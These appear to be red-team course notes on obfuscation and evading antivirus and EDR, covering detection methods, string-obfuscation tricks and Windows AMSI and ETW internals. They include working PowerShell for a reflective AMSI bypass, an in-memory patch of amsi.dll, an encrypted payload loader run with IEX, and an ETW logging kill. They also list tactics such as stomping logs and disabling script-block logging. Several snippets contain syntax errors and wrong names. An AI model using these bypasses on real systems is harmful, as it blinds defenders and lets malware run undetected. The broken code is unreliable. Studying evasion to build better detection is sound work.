<!-- omit in toc -->
# Obfuscation

<!-- omit in toc -->
## Table of Content

- [General](#general)
  - [Goals](#goals)
  - [Evasion Cans and Cants](#evasion-cans-and-cants)
  - [Blue Kill Chain](#blue-kill-chain)
  - [Effectively Not Be Detected](#effectively-not-be-detected)
- [How Does AV and EDR Detect Malware?](#how-does-av-and-edr-detect-malware)
  - [Static Detection](#static-detection)
  - [Dynamic Detection](#dynamic-detection)
- [AMSI and Fileless Malware](#amsi-and-fileless-malware)
  - [What is AMSI?](#what-is-amsi)
  - [Data Flow](#data-flow)
  - [SharpTransactedLoad](#sharptransactedload)
  - [Human vs Machine Analysis](#human-vs-machine-analysis)
- [Obfuscating Static Signatures](#obfuscating-static-signatures)
  - [Unravelling Obfuscation](#unravelling-obfuscation)
  - [What Can Be Done?](#what-can-be-done)
  - [Randomized Capitalization](#randomized-capitalization)
  - [Modifying Byte Strings](#modifying-byte-strings)
    - [Variable Insertion](#variable-insertion)
      - [PowerShell](#powershell)
      - [C#](#c)
    - [Format String](#format-string)
      - [PowerShell](#powershell-1)
      - [C#](#c-1)
  - [Encrypted Strings](#encrypted-strings)
  - [Syntax Trees](#syntax-trees)
    - [Abstract Syntax Tree](#abstract-syntax-tree)
  - [Obfuscation Process](#obfuscation-process)
  - [Staged vs Stageless](#staged-vs-stageless)
- [Dynamic Evasion](#dynamic-evasion)
  - [What Can Be Done?](#what-can-be-done-1)
  - [AMSI Bypass 1: Reflective Bypass](#amsi-bypass-1-reflective-bypass)
    - [What Does It Do?](#what-does-it-do)
    - [Why Does It Work?](#why-does-it-work)
  - [AMSI Bypass 2: Patching AMSI.dll in Memory](#amsi-bypass-2-patching-amsidll-in-memory)
    - [How Does It Work?](#how-does-it-work)
  - [Tools](#tools)
    - [AMSITrigger](#amsitrigger)
    - [AMSI.fail](#amsifail)
- [Event Tracing](#event-tracing)
  - [Event Tracing for Windows](#event-tracing-for-windows)
  - [ETW Bypass PowerShell](#etw-bypass-powershell)
- [Links](#links)

## General

### Goals

- Prevent Reverse Engineering:
  - Protect IP.
  - Hide what it does.
  - Hide infrastructure (C2, channels, internal pivot points).
- Evade detection by anti-virus and hunters:
  - Disable security software.
  - Obfuscate.
  - Encrypt.
  - Blend into network traffic.
  - Leverage trusted processes.
  - Third party communication.

### Evasion Cans and Cants

- Can:
  - Change indicators of compromise.
  - Extend response time of defenders.
- Can't:
  - Erase all indicators.

### Blue Kill Chain

- Funnel of fidelity:
  1. Collection.
  2. Detection (10000000s of events).
  3. Triage (100s of alerts).
  4. Investigation (10s of leads).
  5. Remediation (1s of incidents).

### Effectively Not Be Detected

- How to beat collection:
  - Identify the collector, to potentially disable it.
    - Disable Script Block logging.
    - Turn off NetFlow collection on a router.
- How to beat detection:
  - Most of the effort from red team.
  - Blend into the standard traffic.
  - Obfuscation to avoid malicious signatures.
  - Follow normal traffic flows:
    - A random machine logging into a router is probably pretty strange.
- How to beat triage:
  - Little more scrutiny from defenders
  - Blend into the alerts.
  - Use AV logs to see if anything causes a lot of alerts.
  - Abuse of alert fatigue.
  - Abuse assumptions (mini social engineering).
- How to beat investigation:
  - Hands on analysis beginning to happen.
  - At this point, an activity has been identified as malicious.
  - Prevent them from knowing what is going on:
    - Stomp logs.
    - Obfuscate payloads.
    - Hide.

## How Does AV and EDR Detect Malware?

### Static Detection

- Hashes:
  - Simply hashing the file and comparing it to a database of known signatures.
  - Extremely fragile, any changes to the file will change the entire signature.
- Byte Matching (String Match):
  - Matching a specific pattern of bytes within the code.
- Hash Scanning:
  - Hybrid of the above two methods.
  - Hash sections of code and look for matches.
- Heuristics:
  - File structure.
  - Logic Flows (Abstract Syntax Trees (AST), Control Flow Graphs (CFG), etc.).
  - Rule based detections (if x & y then malicious):
    - These can also be thought of as context-based detections.
  - Often uses some kind of aggregate risk for probability of malicious file.

### Dynamic Detection

- Classification detection.
- Sandboxing: Execute code in a safe space and analyze what it does.
- System logs and events: Event tracing for Windows.
- API Hooking: Instrument and modify the behavior and flow of API calls.

## AMSI and Fileless Malware

### What is AMSI?

- AMSI (Windows Antimalware Scan Interface):
  - Versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine.
  - Provides enhanced malware protection for end-users and their data, applications and workloads.
  - Evaluate commands at run time.
  - Handle multiple scripting languages (PowerShell, JavaScript, VBA).
  - Integrated and will inspect assemblies when the load function is called (.NET 4.8).
  - Provides an API that is AV agnostic.
  - Identify fileless threats.

### Data Flow

![Data Flow](img/Data-Flow.png)

### SharpTransactedLoad

- Load .NET assemblies from memory while having them appear to be loaded from an on-disk location.
- Bypasses AMSI and expands the number of methods available for use in loading arbitrary assemblies while still avoiding dropping files to disk. Some of which provide additional functionality over the traditional `Assembly.Load( )` call.

### Human vs Machine Analysis

- Heavily obfuscated code can be recognized fast by humans but not by automated scans:
  - Pits Logical Evasion against Classification Evasion.

## Obfuscating Static Signatures

### Unravelling Obfuscation

- The code is evaluated when it is readable by the scripting engine.

```powershell
powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAoACIAdABlAHMAdAAiACkA

# Becomes:

Write-Host("test")
```

```powershell
Write-Host("te" + "st")

# Does not become:

Write-Host("test")
```

### What Can Be Done?

- Modify hash.
- Modify byte strings.
- Modify the structure of the code.

### Randomized Capitalization

- Changes the hash of the binary.
- PowerShell ignores capitalization.

```powershell
$test  = "hello world"

# Can be used like:

Write-Host $TEST
Write-Host $TEst
Write-Host $teST
```

- AMSI ignores capitalization, but changing the hash is a best practice.
- C# does not have the same flexibility but changing the capitalization scheme of a variable name modifies the hash.

### Modifying Byte Strings

- Lot of options:
  - Change variable names.
  - Concatenation.
  - Variable insertion.
  - Potentially the order of execution.
  - For C# changing the variable type (List to array).

#### Variable Insertion

##### PowerShell

- PowerShell recognizes $ as a special character in a string and will fetch the associated variable.
- Embed `$var1 = 'context'` into `$var2 = "amsi$var1"`: `$var2 = amsicontext`

##### C\#

- As of C# 6 there is a similar method that can be use:

```cs
string var1 = "context";
string var2 = $"amsi{var1}";
```

- If a decompiler is used to examine the file it will look the same as doing concatenation, but does produce a different file hash.

#### Format String

##### PowerShell

- PowerShell allows for the use of `{ }` inside a string to allow for variable insertion.
  - This is an implicit reference to the format string function.

```powershell
$test = "amsicontext" # Flagged

$test = "amsi{0}text" -f "con" # Not Flagged
```

##### C\#

```cs
string var1 = "context";
string var2 = String.format("amsi{0}", var1);
```

- ILSpy will decompile it to look like variable insertion.

### Encrypted Strings

- Encrypting:

```powershell
$secureString = ConvertTo-SecureString -String '<payload>' -AsPlainText -Force
$encoded = ConvertFrom-SecureString -k (0..15) $secureString > <output file>
```

- Execution:

```powershell
$encoded = <encoded payload>
$Ref = [REF].AssemblyGetType('System.Management.Automation.AmsiUtils')
$Ref.GetField('AmsiInitFailed', 'NonPublic, Static').SetValue($null, $true)
$credential = [System.Management.Automation.PSCredential]::new("tim",(ConvertTo-SecureString -k (0..15) $encoded))
IEX $credential.GetNetworkCredential().Password
```

### Syntax Trees

- Represents source code in both compiled and interpreted languages.
- Creates a tree-like representation of a script/command.

#### Abstract Syntax Tree

![AST](img/AST.png)

### Obfuscation Process

- Break the code into pieces:
  - Identify any words that may be specific triggers.
- Identify any chunks that trigger an alert.
- Run the code together.
- Start changing structure.
  - Start analyzing ASTs.

### Staged vs Stageless

- Scripts and Assemblies are typically evaluated individually as they are loaded:
  - There will still be some carry over of the risk rating.
- Trade off of increased network traffic to less malicious code to be identified.

## Dynamic Evasion

### What Can Be Done?

- Identify "known bad":
  - Sandbox detection.
  - Known hunter/AV processes.
- Change how is executing:
  - Inject a different way.
  - Use a different download method.
  - Circumvent known choke points (D/invoke vs P/invoke).
- Corrupt the detection process:
  - Patch AMSI.
  - Patch ETW.
  - Unhook APIs.

### AMSI Bypass 1: Reflective Bypass

- Simplest Bypass that currently works.

```powershell
$Ref = [REF].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Ref.GetField('amsiInitFailed', 'NonPublic, Static').SetValue($null, $true)

or

$Ref = [REF].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic, Static').SetValue($null, $true)
```

#### What Does It Do?

- Using reflection, AMSI functions are exposed.
- Setting the AmsiInitFailed field to true causes AMSI to return: `AMSI_SCAN_RESULT_NOT_FOUND`

```powershell
if(AmsiUtils.amsiInitFailed){
  return AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED
}
```

#### Why Does It Work?

- AMSI is loaded into the PowerShell process at start up, so it has the same permission levels as the process the malware is in.

### AMSI Bypass 2: Patching AMSI.dll in Memory

- More complicated bypass, but still allows AMSI to load.
- Patches AMSI for both the PowerShell and CLR runtime.

```cs
$MethodDefinition = @'
      [DllImport("kernel32", CharSet=Charset.Ansi, ExactSpelling=true, SetLastError=true)]
      public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

      [DllImport("kernel32", CharSet=Charset.Auto)]
      public static extern IntPtr GetModuleHandle(string lpModuleName);

      [DllImport("kernel32")]
      public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint ldfloldProtect);
'@

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'win32' -PassThru
$ASBD = "Amsis" + "canBuffer"
$Handle = [Win32.Kernel32]::GetModuleHandle("amsi.dll")
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($Handle, $ASBD)
[UInt32]$Size = 0x5
[UInt32]$ProtectFlag = 0x40
[UInt32]$OldProtectFlag = 0
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag)
$Buf = New-Object byte[] 6
$Buf[0] = [UInt32]=xB8
$Buf[1] = [UInt32]=x57
$Buf[2] = [UInt32]=x00
$Buf[3] = [UInt32]=x07
$Buf[4] = [UInt32]=x80
$Buf[5] = [UInt32]=xC3

[System.Runtime.Interopservices.Marshall]::copy($Buf, 0, $BufferAddress, 6)
```

- C# is used to export a few functions from kernel32 that allow to identify where in memory `amsi.dll` has been loaded.
- Modifies the memory permissions to ensure access.
- Modifies the return function to always return a value of `RESULT_NOT_DETECTED`.

#### How Does It Work?

- `AMSI.dll` is loaded into the same security context as the user.
- This means unrestricted access to the memory space of AMSI.
- Tells the function to return a clean result prior to actually scanning.

### Tools

#### AMSITrigger

- `AMSITrigger` is a tool to identify malicious strings in PowerShell files.
- Makes calls using `AMSIScanBuffer` line by line.
- Looks for `AMSI_RESULT_DETECTED` response code.

#### AMSI.fail

- Generates obfuscated AMSI Bypasses in PowerShell.
- Randomly selected and obfuscated.
- No two bypasses have the same signatures.

## Event Tracing

### Event Tracing for Windows

- Made up of three primary components:
  - Controllers: Build and configure tracing sessions.
  - Providers: Generate events under there.
  - Consumers: Interpret the generated events.
- Lots of different event providers.
- Logs things like process creation and start/stop:
  - .NET hunters can see all kinds of indicators from it:
    - Assembly loading activity.
    - Assembly name, function names.
    - JIT compiling events.
- Various alert levels:
  - Key words can automatically elevate alert levels.
  - Custom levels can be set by providers as well.

### ETW Bypass PowerShell

- As mentioned, a very effective way of hunting .NET is trough the use of ETW events.
- Reflectively modify the PowerShell process to prevent events being published:
  - ETW feeds ALL of the other logs, so this disables everything.

```powershell
$LogProvider = [REF].Assembly.GetType('System.Management.Automation.PSEtwLogProvider')
$EtwProvider = $Log.Provider.GetField('EtwProvider', 'NonPublic, Static').GetValue($null)
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled', 'NonPublic, Instance').SetValue($EtwProvider, 0)
```

## Links

- Resources:
  - [Class Resources](https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation)
  - [DevCon presentation](https://www.youtube.com/watch?v=lP2KF7_Kwxk&ab_channel=BCSecurity)
- Tools:
  - [SharpTransactedLoad](https://github.com/G0ldenGunSec/SharpTransactedLoad)
  - [AMSITrigger](https://github.com/RythmStick/AMSITrigger)
  - [AMSI.fail](https://amsi.fail/)
    - [Github](https://github.com/Flangvik/AMSI.fail)
